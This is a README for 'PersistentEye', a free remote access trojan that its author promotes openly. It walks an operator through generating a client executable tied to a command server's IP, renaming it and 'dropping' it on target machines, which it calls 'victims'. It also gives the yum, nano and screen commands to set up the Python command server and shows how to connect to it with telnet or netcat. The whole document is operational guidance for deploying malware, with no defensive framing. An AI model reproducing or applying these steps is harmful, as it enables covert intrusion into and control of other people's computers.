# PersistentEye
Remote Access Tool (Client: C++, Server: Python, SetupTool: C++)

HOW TO SETUP @the.red.team's RAT FOR FREE!!!!! 


			Developed By: 

   ______  __  __                         __ __                     
  / ____ \/ /_/ /_  ___    ________  ____/ // /____  ____ _____ ___ 
 / / __ `/ __/ __ \/ _ \  / ___/ _ \/ __  // __/ _ \/ __ `/ __ `__ \
/ / /_/ / /_/ / / /  __/ / /  /  __/ /_/ // /_/  __/ /_/ / / / / / /
\ \__,_/\__/_/ /_/\___(_)_/   \___/\__,_(_)__/\___/\__,_/_/ /_/ /_/ 
 \____/                                                             


IMPORTANT:
THIS IS A FREE RAT AND I HOPE YOU ENJOY IT AND THAT IT MEETS YOUR EXPECTATIONS.
KEEPING IN MIND THE FACT THAT IT IS FREE, THIS IS NOT THE MOST COMPLEX RAT AND THE PRIVATE VERSION IS NOT TO BE RELEASED.

You will need to rent one server
The command server can have whatever you'd like

======================SETTING UP THE RAT CLIENT======================
Run PersistentEyeSetup.exe
Enter the ip address of the server where the victims will connect
The setup tool will output the RAT.exe which you can rename and start dropping on target computers

Once the Setup tool creates RAT.exe, it is ready to be put on targets


======================TYPES OF SERVERS TO TRY FOR======================

TRY TO MAKE IT SO THE SERVER HAS CENTOS 6.* (This setup is tailored for that OS)
If this is impossible, you will have to replace "yum" with "apt-get"

======================WHERE TO PUT FILES======================

Files to put on your command server: server.py

======================SETTING UP COMMAND SERVER======================

command: cd ~/
command: sudo yum install python -y
command: sudo yum install yum-utils -y
command: sudo yum-builddep python -y
command: sudo yum install screen -y
command: sudo yum install python-devel -y
command: sudo yum install epel-release -y
command: sudo yum install python-pip -y

copy the server code to your server in ~/ if you haven't already

command: nano server.py

Press: Ctrl+W
type: logins and hit enter (this will search for "logins")
Create your own admin logins (After you run the server and login, you will be able to create more admin accounts from the terminal)

Press: Ctrl+W
type: port2 = and hit enter
Enter the port you want users to connect to (Cant be the same as your bot port)

Press: Ctrl+X
Press: Y
Press: Enter

Command: screen python server.py
Press: Ctrl+A
Press: D

YOUR SERVER IS SET UP AND IT IS RUNNING WAITING FOR BOTS AND CLIENTS!

=====================================================================ACCESSING YOUR SERVER AS A CLIENT OR ADMINISTRATOR=====================================================================
If you are accessing the server from LINUX, you can use telnet

from your own computer
command: telnet serverIP userPort
Command example: telnet 8.8.8.8 12345

If you are access the server from WINDOWS, you will need to install netcat (google it) and user netcat
from the windows cmd.exe
command: nc serverIP userPort
command example: nc 8.8.8.8 12345

YOU WILL NOT BE ABLE TO USE PUTTY OR TELNET ON WINDOWS

All IP addresses are logged when connected. Log files can be found in the same folder as the server code on the server backend
You can now use your RAT. Just follow the help message and go for it

DM ME ANY QUESTIONS
